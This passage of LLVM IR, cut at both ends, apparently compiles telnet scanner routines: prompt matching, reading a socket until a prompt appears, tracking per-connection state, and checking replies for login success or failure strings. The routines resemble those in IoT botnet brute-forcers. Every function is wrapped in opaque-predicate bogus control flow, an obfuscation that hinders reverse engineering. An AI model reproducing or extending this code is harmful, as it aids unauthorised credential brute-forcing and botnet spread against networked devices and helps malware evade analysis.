  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %110

; <label>:110:                                    ; preds = %originalBBpart28, %86
  store i32 0, i32* %12, align 4
  br label %111

; <label>:111:                                    ; preds = %110, %29
  %112 = load i32, i32* %12, align 4
  ret i32 %112

originalBBalteredBB:                              ; preds = %originalBB, %3
  %113 = alloca i32, align 4
  %114 = alloca i32, align 4
  %115 = alloca i8*, align 8
  %116 = alloca i32, align 4
  %117 = alloca i8, align 1
  store i32 %0, i32* %114, align 4
  store i8* %1, i8** %115, align 8
  store i32 %2, i32* %116, align 4
  %118 = load i8*, i8** %115, align 8
  %119 = getelementptr inbounds i8, i8* %118, i64 1
  %120 = load i8, i8* %119, align 1
  %121 = zext i8 %120 to i32
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  %122 = load i8*, i8** %14, align 8
  %123 = getelementptr inbounds i8, i8* %122, i64 1
  %124 = load i8, i8* %123, align 1
  %125 = zext i8 %124 to i32
  %126 = icmp eq i32 3, %125
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %93
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %32, %2
  %9 = load i32, i32* @x.55
  %10 = load i32, i32* @y.56
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  %17 = load i8**, i8*** %5, align 8
  %18 = load i32, i32* %6, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %6, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i8*, i8** %17, i64 %20
  %22 = load i8*, i8** %21, align 8
  %23 = icmp ne i8* %22, null
  %24 = load i32, i32* @x.55
  %25 = load i32, i32* @y.56
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %23, label %32, label %33

; <label>:32:                                     ; preds = %originalBBpart2
  br label %8

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i32, i32* @x.55
  %35 = load i32, i32* @y.56
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB5, label %originalBB5alteredBB

originalBB5:                                      ; preds = %originalBB5alteredBB, %33
  store i32 0, i32* %7, align 4
  %42 = load i32, i32* @x.55
  %43 = load i32, i32* @y.56
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart27, label %originalBB5alteredBB

originalBBpart27:                                 ; preds = %originalBB5
  br label %50

; <label>:50:                                     ; preds = %65, %originalBBpart27
  %51 = load i32, i32* %7, align 4
  %52 = load i32, i32* %6, align 4
  %53 = icmp slt i32 %51, %52
  br i1 %53, label %54, label %68

; <label>:54:                                     ; preds = %50
  %55 = load i8*, i8** %4, align 8
  %56 = load i8**, i8*** %5, align 8
  %57 = load i32, i32* %7, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds i8*, i8** %56, i64 %58
  %60 = load i8*, i8** %59, align 8
  %61 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %55, i8* %60)
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %63, label %64

; <label>:63:                                     ; preds = %54
  store i32 1, i32* %3, align 4
  br label %69

; <label>:64:                                     ; preds = %54
  br label %65

; <label>:65:                                     ; preds = %64
  %66 = load i32, i32* %7, align 4
  %67 = add nsw i32 %66, 1
  store i32 %67, i32* %7, align 4
  br label %50

; <label>:68:                                     ; preds = %50
  store i32 0, i32* %3, align 4
  br label %69

; <label>:69:                                     ; preds = %68, %63
  %70 = load i32, i32* %3, align 4
  ret i32 %70

originalBBalteredBB:                              ; preds = %originalBB, %8
  %71 = load i8**, i8*** %5, align 8
  %72 = load i32, i32* %6, align 4
  %_ = shl i32 %72, 1
  %_1 = sub i32 %72, 1
  %gen = mul i32 %_1, 1
  %_2 = sub i32 0, %72
  %gen3 = add i32 %_2, 1
  %_4 = shl i32 %72, 1
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %6, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i8*, i8** %71, i64 %74
  %76 = load i8*, i8** %75, align 8
  %77 = icmp ne i8* %76, null
  br label %originalBB

originalBB5alteredBB:                             ; preds = %originalBB5, %33
  store i32 0, i32* %7, align 4
  br label %originalBB5
}

declare i32 @strcasestr(...) #2

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t*, i32) #0 {
  %3 = load i32, i32* @x.57
  %4 = load i32, i32* @y.58
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca %struct.telstate_t*, align 8
  %12 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %11, align 8
  store i32 %1, i32* %12, align 4
  %13 = load i32, i32* %12, align 4
  %14 = icmp eq i32 %13, 0
  %15 = load i32, i32* @x.57
  %16 = load i32, i32* @y.58
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %28

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %25 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i32 0, i32 0
  %26 = load i32, i32* %25, align 8
  %27 = call i32 @close(i32 %26)
  br label %28

; <label>:28:                                     ; preds = %23, %originalBBpart2
  %29 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %30 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %29, i32 0, i32 7
  store i32 0, i32* %30, align 8
  %31 = load i32, i32* %12, align 4
  %32 = trunc i32 %31 to i8
  %33 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %34 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i32 0, i32 2
  store i8 %32, i8* %34, align 8
  %35 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %36 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i32 0, i32 9
  %37 = load i8*, i8** %36, align 8
  call void @llvm.memset.p0i8.i64(i8* %37, i8 0, i64 1024, i32 1, i1 false)
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %38 = alloca %struct.telstate_t*, align 8
  %39 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %38, align 8
  store i32 %1, i32* %39, align 4
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 0
  br label %originalBB
}

declare i32 @close(i32) #2

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = load i32, i32* @x.59
  %3 = load i32, i32* @y.60
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %10, align 8
  %11 = load %struct.telstate_t*, %struct.telstate_t** %10, align 8
  call void @advance_state(%struct.telstate_t* %11, i32 0)
  %12 = load %struct.telstate_t*, %struct.telstate_t** %10, align 8
  %13 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %12, i32 0, i32 3
  store i8 1, i8* %13, align 1
  %14 = load i32, i32* @x.59
  %15 = load i32, i32* @y.60
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %22 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %22, align 8
  %23 = load %struct.telstate_t*, %struct.telstate_t** %22, align 8
  call void @advance_state(%struct.telstate_t* %23, i32 0)
  %24 = load %struct.telstate_t*, %struct.telstate_t** %22, align 8
  %25 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i32 0, i32 3
  store i8 1, i8* %25, align 1
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = load i32, i32* @x.61
  %3 = load i32, i32* @y.62
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  store i8* %0, i8** %10, align 8
  %11 = load i8*, i8** %10, align 8
  %12 = call i32 @contains_string(i8* %11, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i32 0, i32 0))
  %13 = load i32, i32* @x.61
  %14 = load i32, i32* @y.62
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %12

originalBBalteredBB:                              ; preds = %originalBB, %1
  %21 = alloca i8*, align 8
  store i8* %0, i8** %21, align 8
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 @contains_string(i8* %22, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i32 0, i32 0))
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %26, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i32, i32* @x.65
  %8 = load i32, i32* @y.66
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = load i8*, i8** %2, align 8
  %16 = call i32 @contains_fail(i8* %15)
  %17 = icmp ne i32 %16, 0
  %18 = load i32, i32* @x.65
  %19 = load i32, i32* @y.66
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart2, %1
  %27 = phi i1 [ true, %1 ], [ %17, %originalBBpart2 ]
  %28 = zext i1 %27 to i32
  ret i32 %28

originalBBalteredBB:                              ; preds = %originalBB, %6
  %29 = load i8*, i8** %2, align 8
  %30 = call i32 @contains_fail(i8* %29)
  %31 = icmp ne i32 %30, 0
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.94, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #9
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %193, %1
  %12 = load i32, i32* @x.67
  %13 = load i32, i32* @y.68
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %11
  %20 = load i32, i32* %6, align 4
  %21 = sext i32 %20 to i64
  %22 = load i8*, i8** %4, align 8
  %23 = call i64 @strlen(i8* %22) #9
  %24 = icmp ult i64 %21, %23
  %25 = load i32, i32* @x.67
  %26 = load i32, i32* @y.68
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %24, label %33, label %196

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i32, i32* @x.67
  %35 = load i32, i32* @y.68
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %33
  %42 = load i32, i32* @x.67
  %43 = load i32, i32* @y.68
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %50

; <label>:50:                                     ; preds = %154, %originalBBpart24
  %51 = load i32, i32* %5, align 4
  %52 = load i32, i32* %7, align 4
  %53 = icmp sgt i32 %51, %52
  br i1 %53, label %54, label %152

; <label>:54:                                     ; preds = %50
  %55 = load i32, i32* @x.67
  %56 = load i32, i32* @y.68
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %54
  %63 = load i8*, i8** %3, align 8
  %64 = load i32, i32* %5, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i32, i32* %7, align 4
  %68 = sext i32 %67 to i64
  %69 = sub i64 0, %68
  %70 = getelementptr inbounds i8, i8* %66, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = sext i8 %71 to i32
  %73 = icmp eq i32 %72, 0
  %74 = load i32, i32* @x.67
  %75 = load i32, i32* @y.68
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart215, label %originalBB6alteredBB

originalBBpart215:                                ; preds = %originalBB6
  br i1 %73, label %134, label %82

; <label>:82:                                     ; preds = %originalBBpart215
  %83 = load i32, i32* @x.67
  %84 = load i32, i32* @y.68
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %82
  %91 = load i8*, i8** %3, align 8
  %92 = load i32, i32* %5, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i8, i8* %91, i64 %93
  %95 = load i32, i32* %7, align 4
  %96 = sext i32 %95 to i64
  %97 = sub i64 0, %96
  %98 = getelementptr inbounds i8, i8* %94, i64 %97
  %99 = load i8, i8* %98, align 1
  %100 = sext i8 %99 to i32
  %101 = icmp eq i32 %100, 32
  %102 = load i32, i32* @x.67
  %103 = load i32, i32* @y.68
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart223, label %originalBB17alteredBB

originalBBpart223:                                ; preds = %originalBB17
  br i1 %101, label %134, label %110

; <label>:110:                                    ; preds = %originalBBpart223
  %111 = load i8*, i8** %3, align 8
  %112 = load i32, i32* %5, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8, i8* %111, i64 %113
  %115 = load i32, i32* %7, align 4
  %116 = sext i32 %115 to i64
  %117 = sub i64 0, %116
  %118 = getelementptr inbounds i8, i8* %114, i64 %117
  %119 = load i8, i8* %118, align 1
  %120 = sext i8 %119 to i32
  %121 = icmp eq i32 %120, 13
  br i1 %121, label %134, label %122

; <label>:122:                                    ; preds = %110
  %123 = load i8*, i8** %3, align 8
  %124 = load i32, i32* %5, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds i8, i8* %123, i64 %125
  %127 = load i32, i32* %7, align 4
  %128 = sext i32 %127 to i64
  %129 = sub i64 0, %128
  %130 = getelementptr inbounds i8, i8* %126, i64 %129
  %131 = load i8, i8* %130, align 1
  %132 = sext i8 %131 to i32
  %133 = icmp eq i32 %132, 10
  br label %134

; <label>:134:                                    ; preds = %122, %110, %originalBBpart223, %originalBBpart215
  %135 = phi i1 [ true, %110 ], [ true, %originalBBpart223 ], [ true, %originalBBpart215 ], [ %133, %122 ]
  %136 = load i32, i32* @x.67
  %137 = load i32, i32* @y.68
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %134
  %144 = load i32, i32* @x.67
  %145 = load i32, i32* @y.68
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %152

; <label>:152:                                    ; preds = %originalBBpart227, %50
  %153 = phi i1 [ false, %50 ], [ %135, %originalBBpart227 ]
  br i1 %153, label %154, label %157

; <label>:154:                                    ; preds = %152
  %155 = load i32, i32* %7, align 4
  %156 = add nsw i32 %155, 1
  store i32 %156, i32* %7, align 4
  br label %50

; <label>:157:                                    ; preds = %152
  %158 = load i8*, i8** %3, align 8
  %159 = load i32, i32* %5, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds i8, i8* %158, i64 %160
  %162 = load i32, i32* %7, align 4
  %163 = sext i32 %162 to i64
  %164 = sub i64 0, %163
  %165 = getelementptr inbounds i8, i8* %161, i64 %164
  %166 = load i8, i8* %165, align 1
  %167 = sext i8 %166 to i32
  %168 = load i8*, i8** %4, align 8
  %169 = load i32, i32* %6, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds i8, i8* %168, i64 %170
  %172 = load i8, i8* %171, align 1
  %173 = sext i8 %172 to i32
  %174 = icmp eq i32 %167, %173
  br i1 %174, label %175, label %176

; <label>:175:                                    ; preds = %157
  store i32 1, i32* %2, align 4
  br label %197

; <label>:176:                                    ; preds = %157
  %177 = load i32, i32* @x.67
  %178 = load i32, i32* @y.68
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %176
  %185 = load i32, i32* @x.67
  %186 = load i32, i32* @y.68
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %193

; <label>:193:                                    ; preds = %originalBBpart231
  %194 = load i32, i32* %6, align 4
  %195 = add nsw i32 %194, 1
  store i32 %195, i32* %6, align 4
  br label %11

; <label>:196:                                    ; preds = %originalBBpart2
  store i32 0, i32* %2, align 4
  br label %197

; <label>:197:                                    ; preds = %196, %175
  %198 = load i32, i32* %2, align 4
  ret i32 %198

originalBBalteredBB:                              ; preds = %originalBB, %11
  %199 = load i32, i32* %6, align 4
  %200 = sext i32 %199 to i64
  %201 = load i8*, i8** %4, align 8
  %202 = call i64 @strlen(i8* %201) #9
  %203 = icmp ult i64 %200, %202
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %33
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %54
  %204 = load i8*, i8** %3, align 8
  %205 = load i32, i32* %5, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds i8, i8* %204, i64 %206
  %208 = load i32, i32* %7, align 4
  %209 = sext i32 %208 to i64
  %_ = sub i64 0, 0
  %gen = add i64 %_, %209
  %_7 = sub i64 0, 0
  %gen8 = add i64 %_7, %209
  %_9 = sub i64 0, 0
  %gen10 = add i64 %_9, %209
  %_11 = sub i64 0, 0
  %gen12 = add i64 %_11, %209
  %_13 = shl i64 0, %209
  %210 = sub i64 0, %209
  %211 = getelementptr inbounds i8, i8* %207, i64 %210
  %212 = load i8, i8* %211, align 1
  %213 = sext i8 %212 to i32
  %214 = icmp eq i32 %213, 0
  br label %originalBB6

originalBB17alteredBB:                            ; preds = %originalBB17, %82
  %215 = load i8*, i8** %3, align 8
  %216 = load i32, i32* %5, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds i8, i8* %215, i64 %217
  %219 = load i32, i32* %7, align 4
  %220 = sext i32 %219 to i64
  %_18 = sub i64 0, 0
  %gen19 = add i64 %_18, %220
  %_20 = sub i64 0, 0
  %gen21 = add i64 %_20, %220
  %221 = sub i64 0, %220
  %222 = getelementptr inbounds i8, i8* %218, i64 %221
  %223 = load i8, i8* %222, align 1
  %224 = sext i8 %223 to i32
  %225 = icmp eq i32 %224, 32
  br label %originalBB17

originalBB25alteredBB:                            ; preds = %originalBB25, %134
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %176
  br label %originalBB29
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %originalBBpart228, %8
  %34 = load i32, i32* @x.69
  %35 = load i32, i32* @y.70
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %33
  %42 = load i32, i32* %18, align 4
  %43 = add nsw i32 %42, 2
  %44 = load i32, i32* %16, align 4
  %45 = icmp slt i32 %43, %44
  %46 = load i32, i32* @x.69
  %47 = load i32, i32* @y.70
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %45, label %54, label %64

; <label>:54:                                     ; preds = %originalBBpart2
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %56 = load i64, i64* %55, align 8
  %57 = icmp sgt i64 %56, 0
  br i1 %57, label %62, label %58

; <label>:58:                                     ; preds = %54
  %59 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %60 = load i64, i64* %59, align 8
  %61 = icmp sgt i64 %60, 0
  br label %62

; <label>:62:                                     ; preds = %58, %54
  %63 = phi i1 [ true, %54 ], [ %61, %58 ]
  br label %64

; <label>:64:                                     ; preds = %62, %originalBBpart2
  %65 = phi i1 [ false, %originalBBpart2 ], [ %63, %62 ]
  br i1 %65, label %66, label %217

; <label>:66:                                     ; preds = %64
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %69 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 0
  %70 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %69) #3, !srcloc !5
  %71 = extractvalue { i64, i64* } %70, 0
  %72 = extractvalue { i64, i64* } %70, 1
  %73 = trunc i64 %71 to i32
  store i32 %73, i32* %24, align 4
  %74 = ptrtoint i64* %72 to i64
  %75 = trunc i64 %74 to i32
  store i32 %75, i32* %25, align 4
  br label %76

; <label>:76:                                     ; preds = %67
  %77 = load i32, i32* %10, align 4
  %78 = srem i32 %77, 64
  %79 = zext i32 %78 to i64
  %80 = shl i64 1, %79
  %81 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %82 = load i32, i32* %10, align 4
  %83 = sdiv i32 %82, 64
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds [16 x i64], [16 x i64]* %81, i64 0, i64 %84
  %86 = load i64, i64* %85, align 8
  %87 = or i64 %86, %80
  store i64 %87, i64* %85, align 8
  %88 = load i32, i32* %10, align 4
  %89 = add nsw i32 %88, 1
  %90 = call i32 @select(i32 %89, %struct.fd_set* %21, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %22)
  %91 = icmp slt i32 %90, 1
  br i1 %91, label %92, label %93

; <label>:92:                                     ; preds = %76
  br label %217

; <label>:93:                                     ; preds = %76
  %94 = load i32, i32* @x.69
  %95 = load i32, i32* @y.70
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
